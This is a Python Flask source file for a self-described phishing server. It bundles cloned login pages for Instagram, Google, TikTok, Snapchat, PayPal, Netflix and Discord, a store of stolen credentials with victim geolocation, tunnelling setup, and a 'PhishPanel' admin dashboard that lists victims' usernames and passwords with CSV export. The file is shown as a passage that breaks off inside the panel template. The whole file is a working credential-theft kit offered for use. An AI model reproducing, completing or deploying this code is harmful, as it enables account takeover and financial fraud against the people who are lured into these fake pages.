#!/usr/bin/env python3

#!/usr/bin/env python3
"""
Phishing Server – Glassmorphism Edition (Final)
"""

import json, logging, os, re, secrets, socket, sqlite3, subprocess, sys, threading, time, hashlib
from datetime import datetime, timezone, timedelta
from functools import wraps
from pathlib import Path
from typing import Any, Dict, List, Optional
import requests
from flask import Flask, render_template_string, request, redirect, send_file, session, jsonify
from logging.handlers import RotatingFileHandler

# =============================================================================
# Configuration
# =============================================================================
class Config:
    PHISH_PORT = int(os.environ.get("PHISH_PORT", "8080"))
    DATA_DIR = Path(os.environ.get("PHISH_DATA_DIR", "victims"))
    LOG_FILE = DATA_DIR / "credentials.txt"
    DB_FILE = DATA_DIR / "victims.db"
    ADMIN_USER = os.environ.get("PHISH_ADMIN_USER", "admin")
    ADMIN_PASS_PLAIN = os.environ.get("PHISH_ADMIN_PASS", "orbit2024")
    SECRET_KEY = os.environ.get("PHISH_SECRET_KEY", secrets.token_hex(32))
    CLOUDFLARE_BIN = os.environ.get("CLOUDFLARE_BIN", "cloudflared")
    MAX_USERNAME_LENGTH = 128
    MAX_PASSWORD_LENGTH = 256
    MAX_LOGIN_ATTEMPTS = 5
    LOGIN_BLOCK_DURATION = timedelta(hours=24)
    GEOIP_API = "http://ip-api.com/json/{}?fields=country,countryCode,city,isp,org,as,query"
    DEFAULT_SESSION_TIMEOUT = 30

Config.DATA_DIR.mkdir(parents=True, exist_ok=True)

# -----------------------------------------------------------------------------
# Logging
# -----------------------------------------------------------------------------
log_file = Config.DATA_DIR / "server.log"
file_handler = RotatingFileHandler(log_file, maxBytes=1_000_000, backupCount=3, encoding="utf-8")
console_handler = logging.StreamHandler(sys.stdout)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[file_handler, console_handler],
)
logger = logging.getLogger("phish")

# =============================================================================
# Phishing Page Templates (7 real pages – kept exactly as in previous final version)
# =============================================================================
INSTAGRAM_PAGE = """
<!DOCTYPE html>
<html lang="fr">
    <style>
        /* RESET */
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

/* BODY */
body{
    background:#08171d;
    color:rgb(252, 252, 252);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:12px;
}

/* CONTAINER */
.artboard{
    width:100%;
    max-width:600px;
    background:#08171d;
    border-radius:18px;
    padding:24px;
}
.launge{
    text-align:center;
    margin-top:0px;
    font-size:13px;
    color:#323438de;
    cursor:pointer;
}
/* LOGO */
.logo{
    text-align:center;
    margin-bottom:39px;

}

.logo img{
    width:600px;
    max-width:45%;
}

/* INPUT BOX */
.input-box{
    margin-bottom:15px;
}

/* INPUT */
.input-box input{
    width:112%;
    height:64px;
    background:#08171d;
    border:0.2px solid #fff5f5;
    border-radius:13px;
    padding:0 16px;
    color:rgb(235, 235, 235);
    font-size:16px;
    outline:none;
    transition:0.2s;
    position:relative;
    left:50%;
    transform:translateX(-50%);
}

/* FOCUS */
.input-box input:focus{
    border-color:#0095f6;
    box-shadow:0 0 0 3px rgba(0,149,246,0.15);
}

/* LOGIN BUTTON */
.login-btn{
    width:112%;
    height:48px;
    border:none;
    background:#0842ff;
    border-radius:35px;
    color:rgb(249, 250, 252);
    font-size:17px;
    font-weight:600;
    cursor:pointer;
    margin-top:10px;
    transition:0.2s;
    position:relative;
    left:50%;
    transform:translateX(-50%);
}

/* HOVER */
.login-btn:hover{
    background:#6161d8;
}

/* ACTIVE */
.login-btn:active{
    transform:translateX(-50%) scale(0.98);
}

/* FORGOT */
.forgot{
    text-align:center;
    margin-top:10px;
    font-size:15px;
    color:#cfcfcf;
    cursor:pointer;
}

/* FACEBOOK */
.facebook-btn{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;

    border:1px solid #fbfeff;
    border-radius:35px;

    padding:14px;
    font-size:14px;
    font-weight:600;

    color:#4f3ac7;
    cursor:pointer;
    margin-top:18px;
}

.facebook-btn:hover{
    background:#151515;
}

.facebook-btn img{
    width:18px;
    height:18px;
}

/* SIGNUP */




/* META */
.meta{
    text-align:center;
    margin-top:150px;
    font-size:13px;
    color:#8e8e8e;
    display:flex;
    flex-direction:column;
    align-items:center;
}

.meta img{
    width:70px;
    margin-bottom:8px;
    opacity:0.8;
}
    </style>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram </title>
</head>

<body>

    <div class="artboard">
        <div class="launge">English(US)</div>

        <div class="logo">
            <img src="https://static.vecteezy.com/system/resources/previews/042/148/636/non_2x/instagram-logo-instagram-social-media-icon-free-png.png">
        </div>
    
        <form method="POST" onsubmit="return showError()">
            <div class="input-box">
                <input type="text" name="username" placeholder="Nom d'utilisateur" required>
            </div>
            <div class="input-box">
                <input type="password" name="password" placeholder="Passwords" required>
            </div>
            <button type="submit" class="login-btn">Se connecter</button>
        </form>
    
        <div class="forgot">Forgot Password ?</div>
    
        
    
        <div class="meta">
            <img src="https://ci3.googleusercontent.com/meips/ADKq_NYoTUi7SEY9wvjstXqfwd0DN7KDE70b_uYNb1nRuwnSMFFAJjbEUa26e0hQwTStMYzlV0zYT8wYHrdl3f0XqIRoLbXHeNKSGh1HcMuJIKM1ix4=-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yW/r/EK_fa82Ffa5.png">
            
        </div>
    
    </div>

</body>
</html>
"""




GOOGLE_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google – Sign in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:450px}
.logo{text-align:center;margin-bottom:16px}.logo img{width:75px}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
.sub{text-align:center;font-size:16px;color:#202124;margin-bottom:32px}
input{width:100%;height:56px;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;margin-bottom:24px;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
.info{font-size:14px;color:#5f6368;margin-bottom:32px}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
.next-btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-weight:500;cursor:pointer}</style></head>
<body><div class="container"><div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"></div><h1>Sign in</h1><div class="sub">to continue to Gmail</div>
<form method="POST"><input type="email" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><div class="info">Not your computer? Use Guest mode to sign in privately.</div><div class="actions"><a href="#" class="create">Create account</a><button type="submit" class="next-btn">Next</button></div></form></div></body></html>
"""

TIKTOK_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TikTok - Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.card{width:400px;padding:20px}
.logo{text-align:center;font-size:32px;font-weight:bold;margin-bottom:40px;color:#000}
.logo span:nth-child(2){color:#20d5ec}.logo span:nth-child(3){color:#ff004f}
input{width:100%;height:44px;background:#f1f1f2;border:1px solid #e8e8e8;border-radius:4px;padding:0 16px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#c5c5c9}
.forgot{text-align:right;margin-bottom:24px}.forgot a{color:#8a8b91;text-decoration:none;font-size:12px;font-weight:600}
.login-btn{width:100%;height:46px;background:#fe2c55;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}</style></head>
<body><div class="card"><div class="logo"><span>T</span><span>i</span><span>k</span>Tok</div>
<form method="POST"><input type="text" name="username" placeholder="Email or username" required><input type="password" name="password" placeholder="Password" required><div class="forgot"><a href="#">Forgot password?</a></div><button type="submit" class="login-btn">Log in</button></form></div></body></html>
"""

SNAPCHAT_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#fffc00;display:flex;justify-content:center;align-items:center;height:100vh}
.card{width:360px;text-align:center}.logo{font-size:60px;margin-bottom:30px}
h2{font-size:28px;font-weight:600;margin-bottom:30px}
input{width:100%;height:48px;border:none;padding:0 20px;font-size:16px;outline:none;border-radius:12px;margin-bottom:15px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.login-btn{width:100%;height:50px;background:#000;border:none;border-radius:25px;color:#fffc00;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px}</style></head>
<body><div class="card"><div class="logo">👻</div><h2>Log in to Snapchat</h2>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="login-btn">Log In</button></form></div></body></html>
"""

PAYPAL_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal – Log In</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'PayPalOpen',Arial,sans-serif}
body{background:#f5f7fa;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;padding:30px;width:400px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
.logo{text-align:center;margin-bottom:24px}.logo img{height:32px}
h2{font-weight:400;font-size:22px;margin-bottom:20px;text-align:center}
input{width:100%;height:48px;border:1px solid #9da3a6;border-radius:4px;padding:0 15px;font-size:15px;margin-bottom:16px;outline:none}
input:focus{border-color:#0070ba}
.btn{width:100%;height:48px;background:#0070ba;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
.forgot{text-align:center;margin-top:16px;font-size:14px;color:#0070ba;cursor:pointer}</style></head>
<body><div class="card"><div class="logo"><img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" style="height:40px"></div><h2>Log in to PayPal</h2>
<form method="POST"><input type="text" name="username" placeholder="Email or mobile number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="forgot">Forgot password?</div></div></body></html>
"""

NETFLIX_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix – Sign In</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Netflix Sans','Helvetica Neue',Helvetica,Arial,sans-serif}
body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px 40px;width:450px}
h2{color:#fff;font-size:32px;font-weight:700;margin-bottom:28px}
input{width:100%;height:50px;background:#333;border:none;border-radius:4px;padding:0 20px;color:#fff;font-size:16px;margin-bottom:16px;outline:none}
input::placeholder{color:#8c8c8c}
.btn{width:100%;height:50px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:24px}
.forgot{color:#b3b3b3;font-size:13px;margin-top:12px;cursor:pointer}</style></head>
<body><div class="card"><h2>Sign In</h2>
<form method="POST"><input type="text" name="username" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign In</button></form><div class="forgot">Forgot password?</div></div></body></html>
"""

DISCORD_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Discord – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif}
body{background:#313338;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#2b2d31;border-radius:5px;padding:32px;width:480px}
h2{color:#fff;font-size:24px;font-weight:600;text-align:center;margin-bottom:20px}
input{width:100%;height:40px;background:#1e1f22;border:none;border-radius:3px;padding:0 12px;color:#dbdee1;font-size:16px;margin-bottom:16px;outline:none}
.btn{width:100%;height:44px;background:#5865f2;border:none;border-radius:3px;color:#fff;font-size:16px;font-weight:500;cursor:pointer}
.forgot{color:#00a8fc;font-size:14px;margin-top:8px;cursor:pointer;text-align:center}</style></head>
<body><div class="card"><h2>Welcome back!</h2>
<form method="POST"><input type="text" name="username" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="forgot">Forgot your password?</div></div></body></html>
"""
 

# =============================================================================
# Request Log Buffer
# =============================================================================
REQUEST_LOG = []
MAX_LOG_ENTRIES = 200

def log_request():
    entry = {
        "timestamp": datetime.now(timezone.utc).strftime("%H:%M:%S"),
        "method": request.method,
        "path": request.path,
        "ip": request.remote_addr,
        "user": session.get("username", "anonymous")
    }
    REQUEST_LOG.append(entry)
    if len(REQUEST_LOG) > MAX_LOG_ENTRIES:
        REQUEST_LOG.pop(0)

# =============================================================================
# GLASSMORPHISM ADMIN PANEL (no heavy colors, full glass, custom background)
# =============================================================================
CONTROL_PANEL = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Phish Server – Glass Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <style>
    :root {
        --glass-bg: rgba(255, 255, 255, 0.06);
        --glass-border: rgba(255, 255, 255, 0.12);
        --glass-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
        --text: #E5E7EB;
        --dim: #9CA3AF;
        --radius: 18px;
        --font: 'Inter', system-ui, -apple-system, sans-serif;
        --accent: rgba(124, 58, 237, 0.55);
        --accent-strong: rgba(124, 58, 237, 0.85);
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
        font-family: var(--font);
        background: url('https://images7.alphacoders.com/101/thumb-1920-1010066.jpg') center/cover no-repeat fixed;
        color: var(--text);
        display: flex;
        min-height: 100vh;
        position: relative;
        -webkit-font-smoothing: antialiased;
    }

    body::before {
        content: "";
        position: fixed;
        inset: 0;
        background: rgba(8, 10, 16, 0.55);
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        z-index: -1;
    }

    /* Sidebar */
    .sidebar {
        width: 280px;
        background: rgba(12, 15, 22, 0.72);
        backdrop-filter: blur(28px);
        -webkit-backdrop-filter: blur(28px);
        border-right: 1px solid var(--glass-border);
        display: flex;
        flex-direction: column;
        position: fixed;
        top: 0; left: 0; bottom: 0;
        z-index: 1000;
        transition: transform 0.3s ease;
    }

    .sidebar-header {
        padding: 24px 20px;
        border-bottom: 1px solid var(--glass-border);
    }

    .sidebar-logo {
        display: flex;
        align-items: center;
        gap: 12px;
    }

    .logo-icon {
        width: 44px;
        height: 44px;
        background: var(--accent);
        border-radius: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        box-shadow: 0 4px 18px rgba(124, 58, 237, 0.35);
    }

    .logo-text {
        font-weight: 700;
        font-size: 1.2rem;
        color: white;
        letter-spacing: -0.02em;
    }

    .sidebar-nav {
        flex: 1;
        overflow-y: auto;
        padding: 16px 12px;
    }

    .nav-section { margin-bottom: 24px; }

    .nav-section-title {
        font-size: 0.65rem;
        text-transform: uppercase;
        letter-spacing: 0.1em;
        color: var(--dim);
        padding: 8px 16px;
    }

    .nav-item {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 11px 16px;
        border-radius: 12px;
        color: var(--dim);
        text-decoration: none;
        font-weight: 500;
        font-size: 0.9rem;
        transition: all 0.22s ease;
        margin-bottom: 3px;
    }

    .nav-item:hover {
        background: rgba(255, 255, 255, 0.1);
        color: white;
        transform: translateX(4px);
    }

    .nav-item.active {
        background: rgba(255, 255, 255, 0.14);
        color: white;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
        border-left: 3px solid rgba(255, 255, 255, 0.55);
        padding-left: 13px;
    }

    .sidebar-footer {
        padding: 16px 20px;
        border-top: 1px solid var(--glass-border);
        display: flex;
        align-items: center;
        justify-content: space-between;
    }

    .user-profile {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .user-avatar {
        width: 36px;
        height: 36px;
        background: var(--accent);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 600;
        font-size: 0.8rem;
    }

    .logout-btn {
        color: #EF4444;
        cursor: pointer;
        transition: color 0.2s;
    }

    .logout-btn:hover { color: #f87171; }

    /* Main */
    .main {
        flex: 1;
        margin-left: 280px;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    .topbar {
        background: rgba(12, 15, 22, 0.55);
        backdrop-filter: blur(28px);
        -webkit-backdrop-filter: blur(28px);
        border-bottom: 1px solid var(--glass-border);
        height: 72px;
        padding: 0 30px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        position: sticky;
        top: 0;
        z-index: 500;
    }

    .search-box {
        background: rgba(255, 255, 255, 0.06);
        border: 1px solid var(--glass-border);
        border-radius: 14px;
        padding: 9px 16px;
        display: flex;
        align-items: center;
        gap: 10px;
        width: 320px;
        transition: border-color 0.2s, background 0.2s;
    }

    .search-box:focus-within {
        border-color: rgba(124, 58, 237, 0.5);
        background: rgba(255, 255, 255, 0.09);
    }

    .search-box input {
        background: transparent;
        border: none;
        color: white;
        outline: none;
        width: 100%;
        font-size: 0.9rem;
    }

    .search-box input::placeholder { color: var(--dim); }

    .topbar-actions {
        display: flex;
        align-items: center;
        gap: 16px;
    }

    .icon-btn {
        background: none;
        border: none;
        color: var(--dim);
        padding: 8px;
        border-radius: 12px;
        cursor: pointer;
        position: relative;
        transition: all 0.2s;
    }

    .icon-btn:hover {
        background: rgba(255, 255, 255, 0.1);
        color: white;
    }

    .badge {
        position: absolute;
        top: -2px;
        right: -2px;
        background: #EF4444;
        color: white;
        font-size: 0.65rem;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 600;
    }

    .content {
        padding: 32px;
        flex: 1;
        display: flex;
        flex-direction: column;
    }

    .tab-pane {
        display: none;
        flex: 1;
    }

    .tab-pane.active {
        display: block;
        animation: fadeUp 0.3s ease;
    }

    @keyframes fadeUp {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* Stats */
    .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
        gap: 22px;
        margin-bottom: 32px;
    }

    .stat-card {
        background: var(--glass-bg);
        backdrop-filter: blur(18px);
        -webkit-backdrop-filter: blur(18px);
        border: 1px solid var(--glass-border);
        border-radius: var(--radius);
        padding: 24px;
        transition: all 0.3s ease;
        box-shadow: var(--glass-shadow);
    }

    .stat-card:hover {
        transform: translateY(-5px);
        border-color: rgba(255, 255, 255, 0.2);
        box-shadow: 0 28px 70px rgba(0, 0, 0, 0.45);
    }

    .icon-box {
        width: 48px;
        height: 48px;
        border-radius: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 16px;
    }

    .icon-box.purple { background: rgba(124, 58, 237, 0.22); color: #c4b5fd; }
    .icon-box.green  { background: rgba(34, 197, 94, 0.22);  color: #86efac; }
    .icon-box.blue   { background: rgba(59, 130, 246, 0.22); color: #93c5fd; }

    .stat-value {
        font-size: 2.15rem;
        font-weight: 700;
        color: white;
        letter-spacing: -0.03em;
    }

    .stat-label {
        font-size: 0.78rem;
        text-transform: uppercase;
        letter-spacing: 0.55px;
        color: var(--dim);
        margin-top: 5px;
        font-weight: 500;
    }

    /* Table */
    .table-card {
        background: var(--glass-bg);
        backdrop-filter: blur(18px);
        -webkit-backdrop-filter: blur(18px);
        border: 1px solid var(--glass-border);
        border-radius: var(--radius);
        padding: 24px;
        box-shadow: var(--glass-shadow);
        overflow-x: auto;
    }

    table { width: 100%; border-collapse: collapse; }

    th {
        text-align: left;
        padding: 14px 16px;
        color: var(--dim);
        font-weight: 550;
        font-size: 0.73rem;
        text-transform: uppercase;
        letter-spacing: 0.06em;
        border-bottom: 1px solid var(--glass-border);
        cursor: pointer;
        transition: color 0.2s;
    }

    th:hover { color: white; }

    td {
        padding: 13px 16px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.04);
        font-size: 0.9rem;
    }

    tr:hover td { background: rgba(255, 255, 255, 0.05); }

    .password-cell {
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .password-cell .dots { letter-spacing: 2px; }

    .password-cell button {
        background: none;
        border: none;
        color: var(--dim);
        cursor: pointer;
        transition: color 0.2s;
    }

    .password-cell button:hover { color: white; }

    .country-flag {
        width: 24px;
        margin-right: 6px;
        vertical-align: middle;
    }

    /* Buttons */
    .btn {
        padding: 9px 17px;
        border-radius: 12px;
        border: none;
        font-weight: 600;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
        transition: all 0.22s ease;
        font-size: 0.85rem;
    }

    .btn-primary {
        background: var(--accent);
        color: white;
        box-shadow: 0 4px 18px rgba(124, 58, 237, 0.3);
    }

    .btn-primary:hover {
        background: var(--accent-strong);
        transform: translateY(-1px) scale(1.02);
        box-shadow: 0 6px 22px rgba(124, 58, 237, 0.4);
    }

    .btn-outline {
        background: transparent;
        border: 1px solid var(--glass-border);
        color: var(--text);
    }

    .btn-outline:hover {
        background: rgba(255, 255, 255, 0.1);
        border-color: rgba(255, 255, 255, 0.25);
    }

    .btn-danger {
        background: #EF4444;
        color: white;
    }

    .btn-danger:hover {
        background: #dc2626;
        transform: translateY(-1px);
    }

    .btn-sm {
        padding: 5px 11px;
        font-size: 0.75rem;
        border-radius: 9px;
    }

    /* Modal */
    .modal-overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.72);
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        z-index: 2000;
        display: flex;
        align-items: center;
        justify-content: center;
        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
    }

    .modal-overlay.active {
        opacity: 1;
        visibility: visible;
    }

    .modal {
        background: rgba(16, 19, 27, 0.92);
        backdrop-filter: blur(28px);
        -webkit-backdrop-filter: blur(28px);
        border: 1px solid var(--glass-border);
        border-radius: var(--radius);
        padding: 26px;
        width: 90%;
        max-width: 500px;
        box-shadow: var(--glass-shadow);
    }

    /* Toast */
    .toast {
        position: fixed;
        bottom: 32px;
        right: 32px;
        background: rgba(16, 19, 27, 0.92);
        backdrop-filter: blur(28px);
        -webkit-backdrop-filter: blur(28px);
        border: 1px solid var(--glass-border);
        border-radius: 14px;
        padding: 13px 24px;
        color: white;
        font-weight: 500;
        z-index: 3000;
        transform: translateY(100px);
        opacity: 0;
        transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
    }

    .toast.show {
        transform: translateY(0);
        opacity: 1;
    }

    /* Chat */
    .chat-container {
        display: flex;
        flex-direction: column;
        height: 60vh;
    }

    .chat-messages {
        flex: 1;
        overflow-y: auto;
        padding: 14px;
        background: rgba(0, 0, 0, 0.25);
        border-radius: var(--radius);
        margin-bottom: 12px;
        border: 1px solid var(--glass-border);
    }

    .chat-message { margin-bottom: 10px; }

    .chat-user {
        font-weight: 600;
        color: var(--dim);
        font-size: 0.85rem;
    }

    .chat-text { color: var(--text); }

    .chat-input {
        display: flex;
        gap: 10px;
    }

    .chat-input input {
        flex: 1;
        padding: 11px 14px;
        border-radius: 12px;
        border: 1px solid var(--glass-border);
        background: rgba(255, 255, 255, 0.06);
        color: white;
        outline: none;
        transition: border-color 0.2s;
    }

    .chat-input input:focus {
        border-color: rgba(124, 58, 237, 0.5);
    }

    /* Terminal */
    .terminal {
        background: rgba(0, 0, 0, 0.55);
        backdrop-filter: blur(14px);
        -webkit-backdrop-filter: blur(14px);
        color: #4ade80;
        padding: 18px;
        border-radius: 14px;
        font-family: 'SF Mono', 'Fira Code', monospace;
        height: 100%;
        min-height: 500px;
        overflow-y: auto;
        white-space: pre-wrap;
        font-size: 0.85rem;
        flex: 1;
        border: 1px solid var(--glass-border);
        box-shadow: var(--glass-shadow);
    }

    .analytics-wrapper {
        display: flex;
        flex-direction: column;
        height: 100%;
    }

    /* Mobile */
    @media (max-width: 1024px) {
        .sidebar {
            transform: translateX(-100%);
            z-index: 1100;
        }
        .sidebar.visible {
            transform: translateX(0);
        }
        .main { margin-left: 0; }
        .topbar { padding: 0 16px; }
        .search-box { width: 200px; }
        .menu-toggle {
            display: block;
            position: fixed;
            top: 16px;
            left: 16px;
            z-index: 1200;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(14px);
            -webkit-backdrop-filter: blur(14px);
            border-radius: 12px;
            padding: 10px;
            cursor: pointer;
            color: white;
            border: 1px solid var(--glass-border);
        }
    }

    @media (max-width: 640px) {
        .stats-grid { grid-template-columns: 1fr; }
        .content { padding: 16px; }
        th, td { padding: 9px 10px; font-size: 0.8rem; }
        .btn { padding: 7px 13px; font-size: 0.8rem; }
        .search-box { width: 160px; }
    }
</style>
</head>
<body>
    <!-- Mobile menu toggle -->
    <div class="menu-toggle" onclick="document.getElementById('sidebar').classList.toggle('visible')">
        <i class="fas fa-bars"></i>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <div class="sidebar-logo">
                <div class="logo-icon"><i class="fas fa-shield-haltered"></i></div>
                <div class="logo-text">PhishPanel</div>
            </div>
            <div class="sidebar-subtitle">Glass Edition</div>
        </div>
        <nav class="sidebar-nav">
            <div class="nav-section">
                <div class="nav-section-title">Main</div>
                <a href="#" class="nav-item active" data-tab="dashboard"><i class="fas fa-th-large"></i> Dashboard</a>
                <a href="#" class="nav-item" data-tab="profile"><i class="fas fa-user"></i> Profile</a>
                {% if session.get('can_manage_pages') or session.get('role') == 'super_admin' %}
                <a href="#" class="nav-item" data-tab="pages"><i class="fas fa-file-alt"></i> Pages</a>
                {% endif %}
                {% if session.get('can_manage_settings') or session.get('role') == 'super_admin' %}
                <a href="#" class="nav-item" data-tab="settings"><i class="fas fa-cog"></i> Settings</a>
                {% endif %}
            </div>
            <div class="nav-section">
                <div class="nav-section-title">Monitoring</div>
                {% if session.get('can_view_passwords') or session.get('role') == 'super_admin' %}
                <a href="#" class="nav-item" data-tab="analytics"><i class="fas fa-chart-bar"></i> Analytics</a>
                {% endif %}
            </div>
            <div class="nav-section">
                <div class="nav-section-title">Administration</div>
                {% if session.get('role') == 'super_admin' or session.get('can_manage_users') %}
                <a href="#" class="nav-item" data-tab="users"><i class="fas fa-users-cog"></i> User Manager</a>
                {% endif %}
                {% if session.get('can_chat') %}
                <a href="#" class="nav-item" data-tab="chat"><i class="fas fa-comments"></i> Team Chat</a>
                {% endif %}
            </div>
        </nav>
        <div class="sidebar-footer">
            <div class="user-profile">
                <div class="user-avatar">{{ session.get('username', 'A')[0].upper() }}</div>
                <div class="user-info">
                    <div class="name">{{ session.get('username', 'Admin') }}</div>
                    <div class="role">{{ session.get('role', 'admin') }}</div>
                </div>
            </div>
            <div class="logout-btn" onclick="location.href='/panel/logout'"><i class="fas fa-sign-out-alt"></i></div>
        </div>
    </aside>

    <!-- Main Content -->
    <div class="main">
        <header class="topbar">
            <div class="search-box">
                <i class="fas fa-search"></i>
                <input type="text" placeholder="Search victims..." id="victimSearchInput">
            </div>
            <div class="topbar-actions">
                <span style="color:var(--dim);">{{ session.get('username','Admin') }}</span>
            </div>
        </header>

        <div class="content">
            <!-- Dashboard Tab -->
            <div class="tab-pane active" id="dashboard">
                <div class="stats-grid" id="dashboardStats"></div>
                <div class="table-card" id="victimsTableCard">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
                        <h3>Recent Victims</h3>
                        <div>
                            <button class="btn btn-outline btn-sm" id="exportCSVBtn"><i class="fas fa-download"></i> Export CSV</button>
                            <button class="btn btn-danger btn-sm" id="bulkDeleteBtn" style="display:none;">Delete Selected</button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th><input type="checkbox" id="selectAllCheckbox"></th>
                                <th>Time</th>
                                <th>IP & Country</th>
                                <th>Page</th>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="victimsTbody"></tbody>
                    </table>
                    <div class="pagination" id="paginationControls"></div>
                </div>
            </div>

            <!-- Profile Tab (visible to all) -->
            <div class="tab-pane" id="profile">
                <div class="stat-card" style="max-width:400px;">
                    <h3>Your Profile</h3>
                    <table style="border:none;">
                        <tr><td>Username:</td><td><strong>{{ session.get('username','') }}</strong></td></tr>
                        <tr><td>Role:</td><td><strong>{{ session.get('role','') }}</strong></td></tr>
                        <tr><td>View Passwords:</td><td>{{ '✅' if session.get('can_view_passwords') else '❌' }}</td></tr>
                        <tr><td>Export:</td><td>{{ '✅' if session.get('can_export') else '❌' }}</td></tr>
                        <tr><td>Delete:</td><td>{{ '✅' if session.get('can_delete') else '❌' }}</td></tr>
